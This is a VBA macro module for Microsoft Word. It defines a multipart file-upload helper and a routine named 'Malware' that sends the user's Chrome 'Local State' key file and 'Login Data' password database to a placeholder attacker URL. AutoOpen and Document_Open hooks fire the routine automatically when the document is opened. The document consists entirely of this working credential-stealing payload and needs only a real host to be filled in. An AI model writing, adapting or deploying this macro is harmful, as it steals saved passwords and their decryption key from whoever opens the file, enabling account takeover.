Private Function pvPostFile(sUrl As String, sFileName As String, Optional ByVal bAsync As Boolean) As String
    Const STR_BOUNDARY  As String = "3fbd04f5-b1ed-4060-99b9-fca7ff59c113"
    Dim nFile           As Integer
    Dim baBuffer()      As Byte
    Dim sPostData       As String
 
    '--- read file
    nFile = FreeFile
    Open sFileName For Binary Access Read As nFile
    If LOF(nFile) > 0 Then
        ReDim baBuffer(0 To LOF(nFile) - 1) As Byte
        Get nFile, , baBuffer
        sPostData = StrConv(baBuffer, vbUnicode)
    End If
    Close nFile
    '--- prepare body
    sPostData = "--" & STR_BOUNDARY & vbCrLf & _
        "Content-Disposition: form-data; name=""uploadfile""; filename=""" & Mid$(sFileName, InStrRev(sFileName, "\") + 1) & """" & vbCrLf & _
        "Content-Type: application/octet-stream" & vbCrLf & vbCrLf & _
        sPostData & vbCrLf & _
        "--" & STR_BOUNDARY & "--"
    '--- post
    With CreateObject("Microsoft.XMLHTTP")
        .Open "POST", sUrl, bAsync
        .SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & STR_BOUNDARY
        .Send pvToByteArray(sPostData)
        If Not bAsync Then
            pvPostFile = .ResponseText
        End If
    End With
End Function
 
Private Function pvToByteArray(sText As String) As Byte()
    pvToByteArray = StrConv(sText, vbFromUnicode)
End Function
Private Sub Malware()
    pvPostFile "https://[ATTACKER_URL]/upload.php?id=[TARGET_ID]", "C:\Users\" & Environ("username") & "\AppData\Local\Google\Chrome\User Data\Local State"
    pvPostFile "https://[ATTACKER_URL]/upload.php?id=[TARGET_ID]", "C:\Users\" & Environ("username") & "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
End Sub

Private Sub Launch()
    Malware
End Sub

Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub
